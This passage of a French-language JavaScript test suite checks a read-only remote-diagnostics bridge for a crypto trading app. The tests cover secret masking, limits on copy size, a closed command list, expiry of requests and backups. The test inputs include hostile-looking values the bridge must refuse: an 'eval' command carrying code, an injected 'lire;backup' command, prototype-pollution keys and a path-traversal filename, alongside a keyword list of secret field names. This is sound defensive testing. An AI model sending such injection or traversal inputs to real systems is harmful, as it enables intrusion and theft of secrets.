  X.run('S.portfolio'); assert.strictEqual(typeof X.run('S.walletStore.real'), 'object', 'contrôle : l\'accesseur de 02 crée le portefeuille');
  X.run('S.tradingMode = "sim"; window._bgResolve = true; window._bgFrom = "paperReal";');
  assert.strictEqual(L.etat().ecran, 'paperReal'); assert.strictEqual(J(L.lire({ quoi: 'S', chemin: ['portfolio'] })).v, 1085.46);
  X.run('window._bgResolve = false;'); assert.strictEqual(L.etat().ecran, 'sim'); assert.strictEqual(J(L.lire({ quoi: 'S', chemin: ['portfolio'] })).v, 1055.33);
  X.run('window._bgResolve = true; window._bgFrom = "n\'importe quoi";'); assert.strictEqual(L.etat().ecran, 'sim', '_bgFrom hors liste : ignoré');
});
T('P14 · secrets et objets interdits : tout champ au nom de secret masqué (table des mots), chemin vers un secret refusé ; window, document, localStorage, navigator, un Storage, un élément de page jamais ouverts ; sources hors liste inconnues ; les valeurs des secrets de S connues du dernier filet', async () => {
  const X = monde(), L = X.c._pontLecture;
  const secrets = ['apiKey', 'api_key', 'API_KEY', 'password', 'Authorization', 'secretX', 'botToken', 'jetonPush', 'passwd', 'pwd', 'passphrase', 'mnemonic', 'credential', 'bearer', 'privateKey', 'private_key', 'accessKey', 'access_key', 'webhookUrl', 'cookie', 'jwt'];
  const clairs = ['cycle', 'key', 'cycleMax', 'dynamicPairKeys', '_manConsignes', 'nextAssign', 'patterns', 'passe', 'compte', 'signature'];
  X.run('S.fenetre = window; S.stock = localStorage; S.page = document; S.nav = navigator; S.stock2 = new Storage(); S.noeud = new Node(); S.cfg = { motDePasse: "", vide: { token: "" } };'
    + JSON.stringify(secrets) + '.forEach(function (k) { S.cfg[k] = "V-" + k; }); ' + JSON.stringify(clairs) + '.forEach(function (k) { S.cfg[k] = "V-" + k; });');
  X.ls.set('aura_pont_pat', PAT_OK);
  const v = J(L.lire({ quoi: 'S', chemin: [], prof: 3 })).v;
  assert.strictEqual(v.newsApiKey, '[masqué]'); assert.strictEqual(v.telegramCfg.botToken, '[masqué]'); assert.strictEqual(v.telegramCfg.chatId, '42');
  secrets.forEach(k => assert.strictEqual(v.cfg[k], '[masqué]', k)); clairs.forEach(k => assert.strictEqual(v.cfg[k], 'V-' + k, k));
  assert.strictEqual(v.cfg.motDePasse, ''); assert.deepStrictEqual(v.cfg.vide, { token: '' }, 'un secret vide reste vide (rien à cacher, et on voit qu\'il manque)');
  ['fenetre', 'stock', 'page', 'nav', 'stock2', 'noeud'].forEach(k => assert.strictEqual(v[k], '[interdit]', k));
  assert.ok(/masqué/.test(L.lire({ quoi: 'S', chemin: ['newsApiKey'] })._err)); assert.ok(/masqué/.test(L.lire({ quoi: 'S', chemin: ['telegramCfg', 'botToken'] })._err));
  assert.ok(/n'est pas un objet/.test(L.lire({ quoi: 'S', chemin: ['stock', 'aura_pont_pat'] })._err)); assert.ok(/n'est pas un objet/.test(L.lire({ quoi: 'S', chemin: ['fenetre', 'localStorage'] })._err)); assert.ok(/n'est pas un objet/.test(L.lire({ quoi: 'S', chemin: ['stock2', 'x'] })._err));
  for (const q of ['localStorage', 'window', 'document', 'constructor', '__proto__', 'toString', 'hasOwnProperty', '', null, 7, undefined, {}]) assert.ok(/source inconnue/.test(L.lire({ quoi: q })._err), String(q));
  assert.ok(/source inconnue/.test(L.lire(null)._err) && /source inconnue/.test(L.lire(undefined)._err));
  assert.deepStrictEqual(J(L.sources), ['S', 'RT', 'rec', 'tl', 'lents', 'throttle', 'pont']);
  const d = JSON.stringify(await L.diag()); assert.ok(!/CLE-COINSTATS|ABC-SECRET/.test(d) && !d.includes(PAT_OK));
  assert.ok(/chemin : un tableau/.test(L.lire({ quoi: 'S', chemin: 'cycle' })._err)); assert.ok(/chemin : un tableau/.test(L.lire({ quoi: 'S', chemin: new Array(17).fill('a') })._err));
  const abs = L.lire({ quoi: 'S', chemin: ['walletStore', 'inconnu'] }); assert.ok(/absent/.test(abs._err)); assert.deepStrictEqual(J(abs.cles), ['sim', 'paperReal', 'real']);
  assert.ok(/illisible/.test(L.lire({ quoi: 'S', chemin: [{}] })._err)); assert.strictEqual(J(L.lire({ quoi: 'S', chemin: ['chainLog', 49, 'desc'] })).v, 'ligne 49');
  assert.ok(/absent/.test(L.lire({ quoi: 'S', chemin: ['chainLog', 'constructor'] })._err), 'propriétés propres seulement');
  assert.deepStrictEqual(J(L.secrets()).sort(), ['123456:ABC-SECRET-TG', 'CLE-COINSTATS-SECRETE-123'].concat(secrets.map(k => 'V-' + k).filter(v => v.length >= 12)).sort(),
    'valeurs de 12 caractères au moins (plus courtes, elles masqueraient n\'importe quoi), dans S et ses objets directs');
  // [GO RÉGLAGES · 14/10/2026] S.telegramCfg est non énumérable dans l'app (06 _tgGet) : le jeton reste connu du dernier filet
  X.run('Object.defineProperty(S, "telegramCfg", { value: S.telegramCfg, writable: true, configurable: true, enumerable: false });');
  assert.ok(J(L.secrets()).includes('123456:ABC-SECRET-TG'), 'jeton Telegram non énumérable : inconnu du dernier filet');
});
T('P15 · bornes de la copie : profondeur 8, N derniers d\'un tableau (500 au plus), 400 clés, 2 000 caractères, cycle, 40 000 valeurs — CHAQUE valeur compte (relecture : le coût d\'une lecture est borné) — types nommés (Date, Map, classe, fonction, NaN) ; rien n\'est modifié', async () => {
  const X = monde(), cp = (...a) => J(X.c._pontLecture.copie(...a));
  X.run('class Carnet { constructor() { this.a = 1; } }; var Z = { a: { b: { c: { d: 1 } } }, t: Array.from({ length: 100 }, function (_, i) { return i; }), long: "x".repeat(5000), d: new Date(Date.UTC(2026, 0, 2)), m: new Map([[1, 2]]), f: function () {}, n: NaN, i: Infinity, u: undefined, z: null, vide: [], bool: false, k: new Carnet(), nul: Object.create(null), dx: new Date(NaN), e: new Error("secret"), u8: new Uint8Array([1, 2, 3]) }; Z.nul.x = 1; Z.moi = Z;'
    + 'var G = {}; for (var i = 0; i < 450; i++) G["k" + i] = i; var gros = Array.from({ length: 500 }, function () { return Array.from({ length: 200 }, function (_, j) { return { j: j }; }); }); var plat = Array.from({ length: 500 }, function () { return Array.from({ length: 500 }, function (_, j) { return j; }); });');
  assert.deepStrictEqual(cp(X.run('Z'), 2).a, { b: '[objet · 1 clés]' }); assert.deepStrictEqual(cp(X.run('Z'), 4).a, { b: { c: { d: 1 } } });
  const z = cp(X.run('Z'), 2, { n: 5 });
  assert.deepStrictEqual(z.t, ['… 95 avant', 95, 96, 97, 98, 99]); assert.strictEqual(z.long.length, 2000 + '… [5000 car.]'.length); assert.strictEqual(z.d, '2026-01-02T00:00:00.000Z'); assert.strictEqual(z.dx, '[date]'); assert.strictEqual(z.m, '[Map]'); assert.strictEqual(z.k, '[Carnet]'); assert.strictEqual(z.e, '[Error]'); assert.strictEqual(z.u8, '[Uint8Array]');
  assert.deepStrictEqual(z.nul, { x: 1 }, 'un objet sans prototype est un objet simple');
  assert.strictEqual(z.f, '[function]'); assert.strictEqual(z.n, 'NaN'); assert.strictEqual(z.i, 'Infinity'); assert.strictEqual(z.u, null); assert.strictEqual(z.z, null); assert.deepStrictEqual(z.vide, []); assert.strictEqual(z.bool, false); assert.strictEqual(z.moi, '[cycle]');
  assert.strictEqual(cp(X.run('Z'), 0), '[objet · 18 clés]'); assert.strictEqual(cp(X.run('Z.t'), 0), '[tableau · 100]');
  const g = cp(X.run('G'), 1); assert.strictEqual(Object.keys(g).length, 401); assert.strictEqual(g['…'], '50 clés de plus');
  assert.strictEqual(cp(X.run('Z.t'), 1, { n: 9999 }).length, 100);
  X.run('var six = Array.from({ length: 600 }, function (_, i) { return i; }); var puits = {}, q = puits; for (var k = 0; k < 12; k++) { q.n = { k: k }; q = q.n; }');
  const c6 = cp(X.run('six'), 1, { n: 9999 }); assert.strictEqual(c6.length, 501, 'n borné à 500'); assert.strictEqual(c6[0], '… 100 avant');
  X.run('S.puits = puits;'); const lp = J(X.c._pontLecture.lire({ quoi: 'S', chemin: ['puits'], prof: 99 })).v; let pr = 0, cur = lp; while (cur && typeof cur === 'object') { cur = cur.n; pr++; }
  assert.strictEqual(pr, 8, 'profondeur bornée à 8'); assert.strictEqual(cur, '[objet · 2 clés]');
  assert.strictEqual(J(X.c._pontLecture.lire({ quoi: 'S', chemin: ['puits'], prof: -3 })).v, '[objet · 1 clés]', 'profondeur négative → 0');
  assert.deepStrictEqual(J(X.c._pontLecture.lire({ quoi: 'S', chemin: ['puits'], prof: '5' })).v, { n: { n: '[objet · 2 clés]', k: 0 } }, 'profondeur qui n\'est pas un nombre → 2');
  X.run('S.walletStore.sim.openPositions = Array.from({ length: 45 }, function (_, i) { return { id: "p" + i, pair: "X/USDT", side: "long" }; });');
  const em = X.c._pontLecture.etat().modes.sim; assert.strictEqual(em.nPos, 45); assert.strictEqual(em.positions.length, 40, '40 positions au plus dans etat.json'); assert.strictEqual(em.positions[39].id, 'p44');
  const compte = v => (v && typeof v === 'object') ? Object.values(v).reduce((n, x) => n + compte(x), 1) : 1;
  const big = cp(X.run('gros'), 5, { n: 500 }); assert.ok(JSON.stringify(big).includes('[tronqué]')); assert.ok(compte(big) <= 40000 + 501 * 201, 'objets : ' + compte(big));
  const nb = v => Array.isArray(v) ? v.reduce((n, x) => n + nb(x), 0) : (typeof v === 'number' ? 1 : 0);
  const pl = cp(X.run('plat'), 5, { n: 500 }); assert.ok(nb(pl) < 40000 && nb(pl) > 39000, 'les nombres comptent aussi : ' + nb(pl)); assert.ok(JSON.stringify(pl).includes('[tronqué]'));
  assert.strictEqual(nb(cp(X.run('plat'), 5, { n: 500, noeuds: 1000 })) < 1000, true);
  assert.strictEqual(X.run('Z.t.length'), 100); assert.strictEqual(X.run('Object.keys(G).length'), 450);
});
T('P16 · relecture — la lecture n\'appelle RIEN de l\'app : ni accesseur (étiquette Symbol.toStringTag, champs de _recStatus, AuraChrono, RT, positions), ni toString / valueOf ; une clé « __proto__ » reste une clé ; un objet qui ne s\'ouvre pas ne se traverse pas', async () => {
  const X = monde(), L = X.c._pontLecture;
  X.run('window.__touche = 0; var piege = { get: function () { __touche++; return 5; }, enumerable: true, configurable: true }, mine = { toString: function () { __touche++; return "x"; }, valueOf: function () { __touche++; return 7; } };'
    + 'S.h1 = { a: 1 }; Object.defineProperty(S.h1, Symbol.toStringTag, { get: function () { __touche++; return "X"; } });'
    + 'class K { get [Symbol.toStringTag]() { __touche++; return "K"; } }; S.h2 = new K();'
    + 'S.walletStore.sim.openPositions = [{ id: mine, pair: mine, side: mine, entryPrice: mine, stakeUsdt: mine, pnl: mine, openedAt: mine }]; S.walletStore.sim.portfolio = mine; S.walletStore.sim.totalTrades = mine; S.cycle = mine;'
    + '["lines", "flushes", "lastFlush", "lost", "files", "err", "warn"].forEach(function (k) { Object.defineProperty(window._recStatus, k, piege); });'
    + '["tick", "running", "err", "errAt"].forEach(function (k) { Object.defineProperty(window._tlStatus, k, piege); });'
    + '["currentMode", "running", "chronoSeconds", "netStatus"].forEach(function (k) { Object.defineProperty(window.AuraChrono.state, k, piege); });'
    + 'Object.defineProperty(window.RT, "_lastRealPriceTs", piege); Object.defineProperty(window._auraSimState, "running", piege); Object.defineProperty(S.tendance, "tot", piege); Object.defineProperty(S.perfLog, "gels", piege);'
    + 'S.h4 = JSON.parse(\'{"__proto__": {"x": 1}, "a": 2}\'); S.h5 = new Error("secret"); S.h6 = new Uint8Array([1, 2, 3]); S.h7 = [1, 2]; Object.defineProperty(S.h7, "1", piege);');
  const e = J(L.etat()), d = J(await L.diag()), v = J(L.lire({ quoi: 'S', chemin: [], prof: 4 })).v;
  assert.strictEqual(X.run('__touche'), 0, 'aucun accesseur, aucun toString, aucun valueOf appelé');
  assert.deepStrictEqual(v.h1, { a: 1 }); assert.strictEqual(v.h2, '[K]'); assert.deepStrictEqual(v.h7, [1, '[accesseur non appelé]']);
  assert.deepStrictEqual(e.modes.sim.positions, [{ id: '', paire: '', sens: '', auto: false, entree: null, mise: null, pnl: null, pnlUsdt: null, ouverte: null }]); assert.strictEqual(e.modes.sim.portefeuille, null); assert.strictEqual(e.modes.sim.trades, 0); assert.strictEqual(e.cycle, 0);
  assert.deepStrictEqual(e.rec, { lignes: null, vidages: null, dernierVidage: null, perdues: null, dernierFichier: null, err: null, warn: null }); assert.deepStrictEqual(e.tl, { dernierTick: null, running: null, err: null, errAt: null });
  assert.deepStrictEqual(e.moteur.chrono, { mode: '', enMarche: false, secondes: null }); assert.strictEqual(e.moteur.battement, false); assert.strictEqual(e.reseau.prixAge, null); assert.strictEqual(e.tendance.net, null); assert.strictEqual(e.perf.gel, null);
  assert.strictEqual(d.perfLog.gels, '[accesseur non appelé]'); assert.strictEqual(d.recComplet.lines, '[accesseur non appelé]');
  assert.deepStrictEqual(Object.keys(v.h4), ['__proto__', 'a']); assert.deepStrictEqual(v.h4.__proto__, { x: 1 }); assert.ok(JSON.stringify(L.copie(X.run('S.h4'), 3)).includes('"__proto__":{"x":1}'));
  assert.strictEqual(X.run('Object.getPrototypeOf(window._pontLecture.copie(S.h4, 3)) === Object.prototype'), true, 'le prototype de la copie n\'est pas remplacé');
  assert.ok(/n'est pas un objet qui s'ouvre/.test(L.lire({ quoi: 'S', chemin: ['h5', 'message'] })._err)); assert.ok(/n'est pas un objet qui s'ouvre/.test(L.lire({ quoi: 'S', chemin: ['h6', '0'] })._err)); assert.ok(/n'est pas un objet qui s'ouvre/.test(L.lire({ quoi: 'S', chemin: ['h2', 'x'] })._err));
  assert.strictEqual(X.run('__touche'), 0); assert.strictEqual(X.stats.acc.get, 0);
});

// ───────────── F · demandes : liste fermée ─────────────
T('P17 · ping, etat, diag, lire : servis une fois, réponse bien formée (installation comprise), mémoire tenue ; au relevé suivant plus rien n\'est écrit ; une attente sans fin (navigator.storage.estimate) ne bloque pas diag : 3 s au plus (relecture)', async () => {
  const X = monde(); await X.activer(PAT_OK);
  const a = X.demande(1, 'ping'), b = X.demande(2, 'etat'), d = X.demande(3, 'diag');
  await X.avancer(30000);
  const ra = X.rep(a); assert.deepStrictEqual(Object.keys(ra), ['id', 'cmd', 'ok', 'r', 't', 'iso', 'ms', 'doc', 'v', 'inst']); assert.deepStrictEqual(ra.r, { pong: true }); assert.strictEqual(ra.id, a); assert.strictEqual(ra.cmd, 'ping'); assert.strictEqual(ra.doc, TOK); assert.strictEqual(ra.v, PONT_TOK); assert.strictEqual(ra.inst, mem(X).inst);
  assert.strictEqual(X.rep(b).r.cycle, 1253765); assert.strictEqual(X.rep(b).r.etatPont.etat, 'actif');
  const rd = X.rep(d).r; assert.strictEqual(rd.journal.length, 50); assert.strictEqual(rd.perfLog.gels[0].loaf.dur, 1442); assert.deepStrictEqual(rd.erreursAvalees, { 'x is not defined': 3 }); assert.strictEqual(rd.scripts.liste.length, 2);
  assert.deepStrictEqual(rd.stockage, { usage: 1234, quota: 5678 }); assert.deepStrictEqual(rd.appareil.memoireMo, [21, 30, 954]); assert.strictEqual(rd.RT.SAVE_KEY, 'nexus_state_v2'); assert.strictEqual(rd.recComplet.lines, 4200); assert.deepStrictEqual(rd.erreursPage, []); assert.strictEqual(rd.lents[0].dur, 1408);
  const l = X.demande(4, 'lire', { quoi: 'S', chemin: ['walletStore', 'paperReal', 'openPositions'], prof: 2, n: 1 });
  await X.avancer(30000);
  assert.deepStrictEqual(X.rep(l).r, { quoi: 'S', chemin: ['walletStore', 'paperReal', 'openPositions'], type: 'tableau · 2', v: ['… 1 avant', { id: 'p2', pair: 'PEPE/USDT', side: 'short', entryPrice: 0.00001234, openedAt: T0 - 60000, stakeUsdt: 25, pnl: -1.2, pnlUsdt: -0.3, auto: false }] });
  const lp = X.demande(5, 'lire', { quoi: 'pont' }), lr = X.demande(6, 'lire', { quoi: 'rec', chemin: ['files'] }), lt = X.demande(7, 'lire', { quoi: 'throttle' }), la = X.demande(8, 'lire', { quoi: 'S', chemin: ['walletStore', 'inconnu'] });
  await X.avancer(MIN);
  assert.strictEqual(X.rep(lp).r.v.servis, 6, 'la plus récente d\'abord : lp est lue la dernière'); assert.deepStrictEqual(X.rep(lr).r.v, ['EXTERNAL_STORAGE:Download/AURA/aura_guardian_full_rec-20261010.json']); assert.deepStrictEqual(X.rep(lt).r.v, []);
  assert.strictEqual(X.rep(la).ok, false); assert.ok(/absent/.test(X.rep(la).err)); assert.deepStrictEqual(X.rep(la).cles, ['sim', 'paperReal', 'real']); assert.strictEqual('r' in X.rep(la), false);
  assert.deepStrictEqual(mem(X).fait, [d, b, a, l, la, lt, lr, lp]);
  const n = X.puts(/reponses/).length; await X.avancer(4 * MIN); assert.strictEqual(X.puts(/reponses/).length, n, 'demandes déjà servies : aucune réponse de plus'); assert.strictEqual(X.st().servis, 7); assert.strictEqual(X.st().refus, 1);
  assert.ok(/7 demande\(s\) servie\(s\)/.test(ligne(X)));
  X.c.navigator.storage.estimate = () => new Promise(() => {}); const d2 = X.demande(9, 'diag'); await X.jusqua(() => X.rep(d2) !== null);
  assert.strictEqual(X.rep(d2).ok, true); assert.strictEqual('stockage' in X.rep(d2).r, false); assert.ok(X.rep(d2).ms >= 3000 && X.rep(d2).ms < 6000, 'ms ' + X.rep(d2).ms);
});
T('P18 · hors liste : commande inconnue (eval, ouvrir, fermer, constructor, __proto__, toString), args non objet, id différent du nom, JSON illisible, contenu plus long qu\'annoncé → refus écrit, RIEN exécuté ; fichier trop gros, nom hors gabarit, nom daté de plus de 65 min ou du futur → ignoré sans même être lu', async () => {
  const X = monde(), S = X.run('S'); await X.activer(PAT_OK); const e0 = empreinte(S);
  X.run('window.__touche = 0; window.ouvrir = function () { __touche++; }; window.openPosition = window.ouvrir; window.closePosition = window.ouvrir;');
  const mauvais = ['eval', 'ouvrir', 'openPosition', 'closePosition', 'constructor', '__proto__', 'toString', 'PING', ' ping', '', 'lire;backup'];
  const ids = mauvais.map((cmd, i) => X.demande(10 + i, cmd, { code: '__touche++', quoi: 'S' }));
  await X.avancer(3 * MIN);
  ids.forEach((id, i) => { const r = X.rep(id); assert.ok(r, mauvais[i]); assert.strictEqual(r.ok, false); assert.strictEqual(r.cmd, null); assert.ok(/commande inconnue \(liste fermée : ping, etat, diag, lire, backup\)/.test(r.err), r.err); assert.strictEqual('r' in r, false); });
  const a = X.demande(30, 'ping', 'texte'), b = X.demande(31, 'ping', [1]), cId = X.demande(32, 'ping', undefined, { id: 'autre' });
  const j = X.nom(33); X.gh.poser('demandes/' + j + '.json', '{ pas du json');
  const n = X.nom(34); X.gh.poser('demandes/' + n + '.json', JSON.stringify({ id: n, cmd: 'ping' }));
  const tab = X.nom(35); X.gh.poser('demandes/' + tab + '.json', '[1,2]');
  const menteur = X.nom(36); X.gh.poserSpecial('demandes/' + menteur + '.json', { type: 'file', size: 100, sha: 'a'.repeat(40) }, { type: 'file', encoding: 'base64', content: Buffer.from(JSON.stringify({ id: menteur, cmd: 'ping', t: X.clock.t, x: 'y'.repeat(5000) })).toString('base64') });
  await X.avancer(3 * MIN);
  assert.ok(/args doit être un objet/.test(X.rep(a).err)); assert.ok(/args doit être un objet/.test(X.rep(b).err)); assert.ok(/id différent/.test(X.rep(cId).err)); assert.ok(/JSON illisible/.test(X.rep(j).err)); assert.ok(/t \(ms\) manquant/.test(X.rep(n).err)); assert.ok(/objet est attendu/.test(X.rep(tab).err));
  assert.ok(/demande trop longue/.test(X.rep(menteur).err), 'la taille annoncée par la liste ne suffit pas : le contenu lu est mesuré');
  // ignorés : jamais lus, jamais de réponse
  const gros = X.nom(40), date = M.horo(X.clock.t); X.gh.poser('demandes/' + gros + '.json', JSON.stringify({ id: gros, cmd: 'ping', t: X.clock.t, bourrage: 'x'.repeat(5000) }));
  ['x.json', date + '-ABCD.json', date + '-t042.txt', date + '-t043.json.bak', '..%2Fetat.json', date.slice(0, 13) + '-t044.json', date + '-t04.json', date + '-' + 't'.repeat(13) + '.json'].forEach(f => X.gh.poser('demandes/' + f, JSON.stringify({ id: f.replace('.json', ''), cmd: 'ping', t: X.clock.t })));
  X.gh.poser('demandes/sous/' + X.nom(45) + '.json', JSON.stringify({ id: X.nom(45), cmd: 'ping', t: X.clock.t }));
  X.gh.poser('demandes/' + X.nom(50) + '.json/dedans.json', '{}');   // un DOSSIER au nom de demande : jamais pris pour une demande (le lire donnerait une liste, et une erreur à chaque relevé)
  const vieille = X.demande(60, 'ping', undefined, undefined, X.clock.t - 66 * MIN), future = X.demande(61, 'ping', undefined, undefined, X.clock.t + 20 * MIN), sansDate = '20261399-996199-t062'; X.gh.poser('demandes/' + sansDate + '.json', JSON.stringify({ id: sansDate, cmd: 'ping', t: X.clock.t }));
  const ech0 = X.st().echecs, lus0 = X.lusDem();
  await X.avancer(3 * MIN);
  assert.strictEqual(X.lusDem(), lus0, 'aucun de ces fichiers n\'est lu'); assert.strictEqual(X.st().echecs, ech0, 'aucun incident');
  assert.strictEqual(X.gh.chemins().filter(p => p.startsWith('reponses/')).length, 1 + mauvais.length + 7); [gros, vieille, future].forEach(id => assert.ok(!mem(X).fait.includes(id), 'ni retenue en mémoire'));
  assert.strictEqual(X.run('__touche'), 0); assert.strictEqual(empreinte(S), e0); assert.strictEqual(X.st().servis, 0); assert.strictEqual(X.st().refus, mauvais.length + 7);
});
T('P19 · péremption : 16 min (validité 15) → refus « périmée » avec l\'horloge de la tablette ; ttl 3600 → servie à 58 min, pas à 61 ; ttl au-delà d\'une heure ramené à une heure ; datée de 10 min dans le futur → refus, de 4 min → servie ; le NOM borne tout : plus de 65 min → jamais lue, 63 min → lue, 6 min dans le futur → lue quand son heure approche (relecture)', async () => {
  const X = monde(); await X.activer(PAT_OK); const t = X.clock.t;
  const vieux = X.demande(1, 'ping', undefined, { t: t - 16 * MIN }), ok58 = X.demande(2, 'ping', undefined, { t: t - 58 * MIN, ttl: 3600 }), ko61 = X.demande(3, 'ping', undefined, { t: t - 61 * MIN, ttl: 3600 });
  const ttlFou = X.demande(4, 'ping', undefined, { t: t - 61 * MIN, ttl: 999999 }), futur10 = X.demande(5, 'ping', undefined, { t: t + 10 * MIN }), futur4 = X.demande(6, 'ping', undefined, { t: t + 4 * MIN });
  const ancien = X.demande(7, 'ping', undefined, { t: t - 25 * H }), frais = X.demande(8, 'ping', undefined, { t: t - 14 * MIN });
  const nomVieux = X.demande(20, 'ping', undefined, undefined, t - 66 * MIN), nom63 = X.demande(21, 'ping', undefined, { t: t - 50 * MIN, ttl: 3600 }, t - 63 * MIN), nomFutur = X.demande(22, 'ping', undefined, { t: t + 4 * MIN }, t + 6 * MIN);
  await X.avancer(50000);
  assert.ok(/périmée \(\d{3,4} s, validité 900 s\) · horloge de la tablette 2026-10-11T09:4/.test(X.rep(vieux).err), X.rep(vieux).err); assert.strictEqual(X.rep(ok58).ok, true); assert.ok(/périmée/.test(X.rep(ko61).err)); assert.ok(/validité 3600 s/.test(X.rep(ttlFou).err));
  assert.ok(/datée du futur \(5\d\d s\)/.test(X.rep(futur10).err), X.rep(futur10).err); assert.strictEqual(X.rep(futur4).ok, true); assert.strictEqual(X.rep(frais).ok, true);
  assert.ok(/périmée \(9\d{4} s/.test(X.rep(ancien).err), 'corps daté de 25 h, nom récent : un refus écrit');
  assert.strictEqual(X.rep(nom63).ok, true); assert.strictEqual(X.rep(nomFutur), null, 'pas encore'); assert.strictEqual(X.rep(nomVieux), null);
  const lus = () => X.gh.journal.filter(r => r.m === 'GET' && r.url.endsWith(nomVieux + '.json')).length; assert.strictEqual(lus(), 0);
  assert.ok(X.gh.journal.slice(-2).every(r => !r.h['If-None-Match']), 'une demande attend son heure : la liste est relue en entier');
  await X.avancer(MIN); assert.strictEqual(X.rep(nomFutur).ok, true, 'à moins de 5 min de son heure, elle est lue');
  await X.avancer(10 * MIN); assert.strictEqual(lus(), 0); assert.strictEqual(X.rep(nomVieux), null); assert.ok(!mem(X).fait.includes(nomVieux), 'ni lue, ni répondue, ni retenue');
});
T('P20 · rechargement de la page : une demande déjà servie n\'est PAS resservie (mémoire aura_pont_mem), même si son fichier est toujours là et que la réponse a été retirée ; réponse déjà présente (422 « sha ») → classée, jamais écrasée ; un 422 d\'un autre motif n\'est pas pris pour cela ; des demandes en retard ne chassent pas une demande servie de la mémoire (relecture)', async () => {
  const A = monde(); await A.activer(PAT_OK); const id = A.demande(1, 'ping'); await A.avancer(20000); assert.ok(A.rep(id).ok);
  A.gh.retirer('reponses/' + id + '.json');
  const B = monde({ ls: Object.fromEntries(A.ls), gh: A.gh, t0: A.clock.t + 5000 });
  await B.avancer(5 * MIN);
  assert.strictEqual(A.gh.existe('reponses/' + id + '.json'), false); assert.strictEqual(B.st().servis, 0); assert.strictEqual(B.st().etat, 'actif');
  const id2 = B.demande(2, 'ping'); B.gh.poser('reponses/' + id2 + '.json', '{"deja":true}');
  await B.avancer(MIN);
  assert.strictEqual(B.gh.texte('reponses/' + id2 + '.json'), '{"deja":true}', 'jamais écrasée'); assert.ok(mem(B).fait.includes(id2));
  const n = B.puts(/reponses/).length; await B.avancer(2 * MIN); assert.strictEqual(B.puts(/reponses/).length, n);
  const id3 = B.demande(3, 'ping'); B.gh.panne(r => (r.m === 'PUT' && r.url.endsWith(id3 + '.json') ? { st: 422, j: { message: 'Validation Failed' } } : null));
  await B.avancer(30 * MIN);
  assert.strictEqual(B.puts(new RegExp(id3)).length, 3, 'trois essais, pas un de plus'); assert.strictEqual(B.rep(id3), null); assert.ok(mem(B).fait.includes(id3)); assert.strictEqual(B.st().refus, 1);
  // 150 demandes en retard (nom de 2 h) : la mémoire des demandes servies n'est pas chassée, la demande servie n'est pas rejouée
  B.gh.pannes.length = 0; const id4 = B.demande(4, 'backup'); await B.jusqua(() => B.rep(id4) !== null); assert.ok(B.rep(id4).ok); B.gh.retirer('reponses/' + id4 + '.json');
  for (let i = 0; i < 150; i++) B.demande(500 + i, 'ping', undefined, { t: B.clock.t - 26 * H }, B.clock.t - 2 * H - i * 1000);
  const lus = B.lusDem(); await B.avancer(10 * MIN);
  assert.ok(mem(B).fait.includes(id4)); assert.strictEqual(B.gh.chemins().filter(p => p.startsWith('backups/a')).length, 1, 'un seul backup'); assert.strictEqual(B.lusDem(), lus); assert.strictEqual(B.rep(id4), null);
  // mémoire pleine (100) : la plus ancienne sort, la mémoire reste bornée ; mémoire abîmée : le pont repart d'une mémoire vide sans casser
  const pleine = Array.from({ length: 100 }, (_, i) => 'vieille-' + i);
  const D = monde({ ls: { aura_pont_pat: PAT_OK, aura_pont_mem: JSON.stringify({ inst: 'abc1234', fait: pleine.concat([7, 'x'.repeat(41)]), sha: 'pas-un-sha', etatAt: T0 + 9 * H, backupAt: 'x', ecrits: [T0 - 2 * H, T0 + H, 'x'] }) } });
  const id5 = D.demande(5, 'ping'); await D.avancer(MIN);
  assert.ok(D.rep(id5).ok); assert.strictEqual(mem(D).fait.length, 100); assert.strictEqual(mem(D).fait[99], id5); assert.strictEqual(mem(D).fait[0], 'vieille-1'); assert.strictEqual(mem(D).inst, 'abc1234');
  assert.strictEqual('sha' in D.puts(/etat\.json$/)[0].corps, false, 'un sha gardé qui n\'en a pas la forme n\'est pas envoyé'); assert.ok(D.puts(/etat\.json$/).length >= 1, 'une date d\'état du futur ne retient pas l\'état'); assert.ok(mem(D).ecrits.every(x => x >= T0), 'écritures hors de l\'heure, du futur ou illisibles : oubliées');
  const C = monde({ ls: { aura_pont_pat: PAT_OK, aura_pont_mem: '{ abîmé' } }); await C.avancer(20000); assert.strictEqual(C.st().etat, 'actif'); assert.ok(/^[a-z0-9]{6,16}$/.test(mem(C).inst));
});
T('P21 · réponse trop longue (400 000 caractères au plus) → refus qui le dit ; 3 demandes par relevé au plus, la PLUS RÉCENTE d\'abord, quel que soit l\'ordre de la liste ; liste relue tant qu\'il en reste, puis ETag : 304, plus aucune autre requête', async () => {
  const X = monde(); X.run('S.gros = Array.from({ length: 400 }, function (_, i) { return { i: i, t: "y".repeat(1500) }; });');
  await X.activer(PAT_OK);
  const g = X.demande(1, 'lire', { quoi: 'S', chemin: ['gros'], prof: 3, n: 500 });
  await X.avancer(20000);
  assert.strictEqual(X.rep(g).ok, false); assert.ok(/réponse trop longue \(\d{6} caractères, 400000 au plus\)/.test(X.rep(g).err), X.rep(g).err); assert.ok(X.gh.texte('reponses/' + g + '.json').length < 400); assert.strictEqual(X.rep(g).inst, mem(X).inst); assert.strictEqual(X.st().refus, 1);
  X.gh.melange = true; const ids = [5, 3, 6, 2, 4].map(n => X.demande(n, 'ping'));
  await X.avancer(15000 + 9000);
  assert.deepStrictEqual(X.gh.chemins().filter(p => p.startsWith('reponses/2026')).map(p => p.slice(9, 29)), [g, ids[4], ids[0], ids[2]], 'les 3 plus récentes d\'abord (6, 5, 4)');
  const ordre = X.puts(/reponses/).slice(1).map(r => r.url.slice(-25, -5)); assert.deepStrictEqual(ordre, [ids[2], ids[0], ids[4]], 'dans cet ordre');
  await X.avancer(15000);
  assert.ok(ids.every(id => X.rep(id).ok));
  const i0 = X.gh.journal.length; await X.avancer(MIN);
  const suite = X.gh.journal.slice(i0); assert.ok(suite.length >= 3); assert.ok(suite.every(r => r.m === 'GET' && r.url === DEPOT + '/contents/demandes' && !!r.h['If-None-Match']), JSON.stringify(chemins(suite)));
});

// ───────────── G · backup ─────────────
T('P22 · backup : backups/aura_guardian_full_<date>.json.gz, MÊME enveloppe que l\'export RÉEL de 10h (seule la source diffère) ; un toutes les 2 min au plus, compté d\'un backup ÉCRIT ; état non prêt → refus ; écriture du backup ratée → refus, nouvel essai permis tout de suite ; réponse non écrite (réseau) → la MÊME réponse repart, le backup n\'est pas refait (relecture) ; sans compression, ou compression qui traîne (30 s) → .json en clair', async () => {
  const X = monde(); await X.activer(PAT_OK);
  const b = X.demande(1, 'backup'); await X.jusqua(() => X.rep(b) !== null);
